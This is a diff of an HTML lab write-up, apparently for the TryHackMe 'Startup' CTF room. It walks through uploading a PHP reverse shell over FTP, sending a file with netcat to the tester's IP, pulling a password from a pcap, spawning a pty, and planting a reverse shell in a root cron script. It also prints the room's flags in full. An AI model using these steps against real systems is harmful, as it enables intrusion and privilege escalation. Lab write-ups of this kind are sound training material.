@@ -3,6 +3,8 @@
 <!--This is the title-->
   <link rel="stylesheet" href="custom.css">
   <h1>Week 9 Lab: Startup [THM]</h1>
+  <p>NOTE: I meant to hide the flags but it's 50/50 because I'm tired so if you want to be left in the dark do not proceed.</p>
+  <p>      When this note is gone all flags can be assumed as gone/hidden.</p>
   
 <!-----------------------------------------Reconnaissance/Q1----------------------------------------->
   <h2>Task 1: Welcome to Spice Hut!</h2>
@@ -33,7 +35,7 @@
       <img src="Images/Lab 9/forbidden.png" alt="img 3" class="center"/>
     <p>And so the only other accessible URL is http://$IP/files which shows this:</p>
       <img src="Images/Lab 9/files on webpage.png" alt="img 5" class="center"/>
-  <h2>Reverse Shell</h2>
+  <h2>PHP Reverse Shell</h2>
     <p>So far the files look the same as the ones I accessed through FTP. This makes me think the machine we have access to is the server for the web page and now I want to try uploading a file through FTP and see if it shows up on http://$IP/files. Since the FTP directory has all actions available (read/write/exe), I uploaded a test file and compared it with the URL directory.</p>
       <img src="Images/Lab 9/add test file.png" alt="img 6" class="center"/>
     <p>After seeing that the file was uploaded, this confirms that a reverse shell script could be uploaded to view more files. I am running Kali Linux which has some premade scripts I can use and just changed the IP variable to my local machine and the port to listen for the script’s output. If there aren’t any premade scripts on your machine there are plenty of scripts listed by <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="pentestmonkey" class="link">pentestmonkey</a> and other users of the internet. I found the php script the easiest to alter as it’s the same one provided by Kali Linux. </p>
@@ -49,11 +51,55 @@
       <img src="Images/Lab 9/answer to q1.png" alt="img 10" class="center"/>
     <p>What is the secret spicy soup recipe? LOVE</p>
   
-<!-----------------------------------------Priv Esc/ Q2----------------------------------------->
-  <h3>Privilege Escalation</h3>
   
-  <p>place holder</p>
-      <img src="Images/Lab 7/test.gif" alt="idk" class="center"/>
+<!-----------------------------------------Priv Esc/ Q2----------------------------------------->
+  <h2>Privilege Escalation</h2>
+  
+  <h2>Wireshark</h2>
+    <p>The only thing of interest left is the incidents directory and maybe the home or etc directories to find possible user accounts.</p>
+      <img src="files found in shell.png" alt="img 11" class="center"/>
+    <p>In the incidents dir there is a wireshark file titled suspicious which is suspicious so that might be worth a look, and in the home directory there was a dir titled lennie which might be a possible user but access is denied. Also, there might be a login visible in the wireshark file that could help escalate our privileges.</p>
+    <p>To get the file I decided to use netcat. I set a random, unimportant port on my local machine to listen and sent the file from the target machine.</p>
+    <p>Local (receiving file): <code> nc -l 1234 > suspicious.pcapng </code></p>
+    <p>Target (sending file): <code> nc -w 3 10.10.118.200 1234 < suspicious.pcapng </code></p>
+    <p>I opened the file and looked through the packets. I noticed a packet (34) that used GET for a shell.php file:</p>
+      <img src="Images/Lab 9/sus packet find.png" alt="img 12" class="center"/>
+    <p>Also, starting at packet 40 the plaintext looks like a shell being booted up so this is probably when this user accessed our target host:</p>
+      <img src="Images/Lab 9/sus packet shell boot.png" alt="img 13" class="center"/>
+    <p>The port number for the user interacting with the shell is associated with the TCP port 4444:</p>
+      <img src="Images/Lab 9/port identified.png" alt="img 14" class="center"/>
+    <p>So after filtering for that specific port I can better sift through the packets to hopefully find a successful login with an authorized user’s password. Then at packet 152 the user tries accessing the dir for lennie but is denied access as well. At packet 175 it shows that the user was prompted for the password for user www-data:</p>
+      <img src="Images/Lab 9/sudo passwd prompt.png" alt="img 15" class="center"/>
+    <p>And then the password given is shown as well:</p>
+      <img src="Images/Lab 9/passwd found.png" alt="img 16" class="center"/>
+    <p>I’m going to try the password to access Lennie's dir but I need to be in a terminal not just a shell to run sudo so I run this cmd:</p>
+    <p><code> python3 -c “import pty;pty.spawn(‘/bin/bash’)” </code></p>
+      <img src="Images/Lab 9/lennie login.png" alt="img 17" class="center"/>
+    <p>….And I’m able to switch users to lennie. I can now view their directory and there is a Documents dir, Scripts dir, and a user.txt file. In user.txt is a flag for question 2:</p>
+      <img src="Images/Lab 9/lennie login.png" alt="img 18" class="center"/>
+    <p>What are the contents of user.txt? THM{03ce3d619b80ccbfb3b7fc81e46c0e79}</p>
+  
+  
+<!-----------------------------------------Priv Esc [Root]/ Q3----------------------------------------->
+  <h3>Privilege Escalation [Root]</h3>
+  
+  <h2>Access Granted!</h2>
+    <p>Now to look at the other directories. So far we learn Lennie has a dog and for some reason wants to delete the incident logs, hmmmm. In the Scripts dir there’s a sh file and a txt file. The bash script simply prints the txt file which is a list, then runs another bash file (print.sh):</p>
+      <img src="Images/Lab 9/lennie login.png" alt="img 18" class="center"/>
+  <h2>Bash Reverse Shell</h2>
+    <p>Let’s open this print.sh file! It is essentially empty but we could write a script to gain root access. The file planner.sh is owned by root so we don’t have permission to alter it but we have permission to write on print.sh. So if we run planner.sh with a reverse shell script added to print.sh, it will open a shell for root since root owns the file.</p>
+  <h2>Detour: Fully Functional Terminal</h2>
+    <p>So I tried using nano to edit the file but it wasn’t working with an error of “unknown” which was very helpful. Just kidding it wasn’t but I realized that I didn’t allow shortcuts and auto completion when I started my current terminal which also allows the use of nano. So I put netcat in the background (CTRL+Z) and ran “stty raw -echo” on my local machine then brought back netcat with the “fg” cmd. I still wasn’t able to use nano but it’s still useful to perform the steps above for a fully functional terminal. So then I tried vi and it worked to alter the file with a bash reverse shell script:</p>
+      <img src="Images/Lab 9/lennie login.png" alt="img 18" class="center"/>
+  <h2></h2>
+    <p>Now that I added the script I wasn’t sure how to execute planner.sh since I wasn’t root…. yet. So after some googling I noticed that looking up scheduled processes is common to look at for privilege escalation and a common tool to use is ps.py. This piqued my interest since the root script is labeled planner.sh and the list is labeled startup_list so it might be a scheduled task by root.</p>
+    <p>I downloaded <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" title="ps.py" class="link">ps.py</a> onto my local machine and used netcat to upload it to the target machine since it doesn’t have internet access to download directly. Since we aren’t root we need to write the tool to a place that is world-writable, or where everyone has permissions to write. Some common world-writable directories are /tmp and /var/tmp but a good “hacker” spot would be /dev/shm. This directory is backed by RAM so it allows fast access and guarantees that whatever you write is destroyed at reboot.</p>
+    <p>So changing directories and enabling executable permissions for pspy64 we can launch it and see what tasks are scheduled:</p>
+      <img src="Images/Lab 9/lennie login.png" alt="img 18" class="center"/>
+    <p></p>
+    <p></p>
+      <img src="Images/Lab 9/lennie login.png" alt="img 18" class="center"/>
+    <p>What are the contents of root.txt? THM{f963aaa6a430f210222158ae15c3d76d}</p>
     
   <br>
   <br>
